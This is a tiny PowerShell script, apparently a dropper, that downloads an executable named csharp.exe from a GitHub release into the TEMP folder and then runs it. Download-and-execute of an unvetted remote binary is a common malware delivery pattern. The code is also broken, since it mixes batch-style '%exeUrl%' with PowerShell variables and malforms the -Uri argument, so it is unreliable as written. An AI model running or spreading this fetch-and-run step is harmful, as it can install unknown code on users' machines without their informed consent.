%exeUrl% = "https://github.com/bispo-exe/teste/releases/download/v1.0.0/csharp.exe"
$localPath= "$env:TEMP\csharp.exe"

Invoke-WebRequest Url - $exeUrl -OutFile $localPath

Start-Process -FilePath $localPath -wait